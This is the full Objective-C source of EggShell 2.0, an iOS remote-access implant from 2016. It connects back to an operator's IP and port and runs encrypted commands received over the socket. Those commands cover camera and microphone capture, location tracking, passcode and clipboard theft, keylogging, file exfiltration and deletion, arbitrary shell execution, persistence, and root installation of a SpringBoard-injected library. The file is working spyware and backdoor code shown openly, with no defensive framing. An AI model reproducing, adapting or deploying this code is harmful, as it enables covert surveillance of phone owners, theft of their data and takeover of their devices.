//EggShell 2.0
//Created By lucas.py 8-18-16
//Last update 9-17-16
//Copyright 2016 Lucas Jackson

#include "espl.h"
#import "eshelper.h"

NSString *bkey = @"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV";
NSString *logfile = @"/tmp/.esplog";

espl *_espl;
BOOL debug = false;

NSString *tmpData = @"";
NSArray *noReplyCommands = [[NSArray alloc] initWithObjects:
@"play", @"pause", @"next", @"prev", @"home", @"doublehome", @"lock", @"wake",@"keylogclear",@"togglemute",@"lockout",nil];
NSArray *yesReplyCommands = [[NSArray alloc] initWithObjects:
@"ismuted",@"getpasscode",@"getpaste",@"unlock",@"keylog",@"lastapp",@"islocked",nil];

int main(int argc, const char * argv[]) {
    _espl = [[espl alloc] init];
    if (argc == 1) { return 0; }
    
    //decrypt argument with shared key
    NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
    argument = [escryptor decryptB64ToNSString:bkey :argument];
    
    //argument to json
    NSError *initError = nil;
    NSDictionary *initDictionary = [eshelper stringToJSON:argument :initError];
    if (initError != nil) {
        HBLogDebug(@"echo '%@' >> %@",initError,logfile);
        return 0;
    }
    //init params
    NSString *ip = [initDictionary objectForKey:@"ip"];
    HBLogDebug(@"echo '%@' >> %@",ip,logfile);
    
    int port = [[initDictionary objectForKey:@"port"] intValue];
    _espl.skey = [initDictionary objectForKey:@"key"];
    _espl.terminator = [initDictionary objectForKey:@"term"];
    debug = [[initDictionary objectForKey:@"debug"] boolValue];
    
    //connect
    int success = [_espl connect:ip :port];
    if (success == -1) {
        HBLogDebug(@"couldnt establish connection %@ %d %@ %@",ip,port,_espl.terminator,_espl.skey);
    }
    else {
        NSString *name = [NSString stringWithFormat:@"%@ %@@%@",[[_espl thisUIDevice] identifierForVendor],NSUserName(),[[_espl thisUIDevice] name]];
        [_espl sendString:name];
        NSString *command;
        char buffer[2048];
        while (read(sockfd, &buffer, sizeof(buffer))) {
            //decrypt received data
            command = [escryptor decryptB64ToNSString:_espl.skey : [NSString stringWithFormat:@"%s",buffer]];
            //json decode decrypted received data
            NSError *decodeError = nil;
            NSDictionary *receivedDictionary = [eshelper stringToJSON:command :decodeError];
            //if there was an error with our input, a message is helpful
            if (decodeError != nil) {
                if (debug) HBLogDebug(@"echo '%@' >> %@",command,logfile);
                [_espl sendString:[NSString stringWithFormat:@"%@",decodeError]];
            }
            //assign
            NSString *cmd = [receivedDictionary objectForKey:@"cmd"];
            NSString *cmdArgument = [receivedDictionary objectForKey:@"args"];
            NSString *cmdType = [receivedDictionary objectForKey:@"type"];
            _espl.terminator = [receivedDictionary objectForKey:@"term"];
            
            if (debug) [_espl eslog:command];
        
            if ([cmdType isEqualToString:@"upload"]) {
                if ([cmd isEqualToString: @"upload"]) {
                    [_espl receiveFileData:cmdArgument :[[receivedDictionary objectForKey:@"filesize"] longValue]];
                }
            }
            else if ([cmdType isEqualToString:@"download"]) {
                [_espl eslog:@"running download command"];
                NSData *rawdata = nil;
                if ([cmd isEqualToString: @"frontcam"]) {
                    [_espl eslog:@"calling espl frontcam"];
                    rawdata = [_espl camera:true];
                }
                else if ([cmd isEqualToString: @"backcam"]) {
                    [_espl eslog:@"calling espl backcam"];
                    rawdata = [_espl camera:false];
                }
                else if ([cmd isEqualToString: @"download"]) {
                    rawdata = [_espl filePathToData:cmdArgument];
                }
                else {
                    [_espl sendString:[NSString stringWithFormat:@"unable to perform %@",cmd]];
                }
                [_espl eslog:@"about to send rawdata"];
                if (rawdata != NULL && rawdata.length > 0) {
                    [_espl eslog:[NSString stringWithFormat:@"sending rawdata %d",rawdata.length]];
                    [_espl sendFileData:rawdata];
                }
                else {
                    [_espl eslog:@"data is null"];
                }
            }
            else if ([cmd isEqualToString: @"exit"]) {
                exit(1);
            }
            else if ([cmd isEqualToString: @"pid"]) {
                [_espl getPid];
            }
            else if ([cmd isEqualToString: @"vibrate"]) {
                [_espl vibrate];
            }
            else if ([cmd isEqualToString: @"alert"]) {
                [_espl alert:[cmdArgument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]]];
            }
            else if ([cmd isEqualToString: @"reboot"]) {
                [_espl exec:@"reboot"];
            }
            else if ([cmd isEqualToString: @"ls"]) {
                [_espl directoryList:cmdArgument];
            }
            else if ([cmd isEqualToString: @"sh"]) {
                [_espl exec:cmdArgument];
                [_espl blank];
            }
            else if ([cmd isEqualToString: @"cd"]) {
                [_espl changeWD:cmdArgument];
            }
            else if ([cmd isEqualToString: @"rm"]) {
                [_espl rmFile:cmdArgument];
            }
            else if ([cmd isEqualToString: @"pwd"]) {
                [_espl sendString:_espl.fileManager.currentDirectoryPath];
            }
            else if ([cmd isEqualToString: @"setvol"]) {
                [_espl setVolume:cmdArgument];
            }
            else if ([cmd isEqualToString: @"getvol"]) {
                [_espl getVolume];
            }
            else if ([cmd isEqualToString: @"isplaying"]) {
                [_espl isplaying];
            }
            else if ([cmd isEqualToString: @"openurl"]) {
                [_espl openURL:cmdArgument];
            }
            else if ([cmd isEqualToString: @"dial"]) {
                [_espl dial:cmdArgument];
            }
            else if ([cmd isEqualToString: @"mic"]) {
                [_espl mic:cmdArgument];
            }
            else if ([cmd isEqualToString: @"locate"]) {
                [_espl locate];
            }
            else if ([cmd isEqualToString: @"respring"]) {
                [_espl exec:@"killall SpringBoard"];
                [_espl blank];
            }
            else if ([cmd isEqualToString: @"battery"]) {
                [_espl sendString:[_espl battery]];
            }
            else if ([cmd isEqualToString: @"listapps"]) {
                [_espl listapps];
            }
            else if ([cmd isEqualToString: @"open"]) {
                [_espl launchApp:cmdArgument];
            }
            else if ([cmd isEqualToString: @"sysinfo"]) {
                [_espl sysinfo];
            }
            else if ([cmd isEqualToString: @"say"]) {
                [_espl say:[command stringByReplacingOccurrencesOfString: @"say " withString:@""]]; //TODO: fix this idiot
            }
            else if ([cmd isEqualToString: @"persistence"]) {
                [_espl persistence:ip :port];
            }
            else if ([cmd isEqualToString: @"rmpersistence"]) {
                [_espl rmpersistence];
            }
            else if ([cmd isEqualToString: @"installpro"]) {
                if (getuid() == 0) {
                    [_espl sendString:@"1"];
                    [_espl upload:@"/Library/MobileSubstrate/DynamicLibraries/eggshellPro.dylib"];
                    [_espl exec:@"echo '{ Filter = { Bundles = ( \"com.apple.springboard\" ); }; }' > /Library/MobileSubstrate/DynamicLibraries/eggshellPro.plist;killall SpringBoard"];
                    [_espl blank];
                }
                else {
                    [_espl sendString:@"Requires Root"];
                }
            }
            //PRO Commands
            else if ([cmd isEqualToString: @"locationservice"]) {
                [_espl locationService:cmdArgument];
            }
            else if ([noReplyCommands containsObject:cmd]) {
                [_espl mcSendNoReply:cmd];
            }
            else if ([yesReplyCommands containsObject:cmd]) {
                [_espl mcSendYesReply:cmd];
            }
            else {
                if ([cmd isEqualToString:@"endtask"]) {
                    [_espl runtask:cmd];
                }
                else {
                    [_espl runtask:[NSString stringWithFormat:@"%@ %@",cmd,cmdArgument]];
                }
            }
            //clear the received data
            memset(buffer,'\0',2048);
        }
    }
	return 0;
}
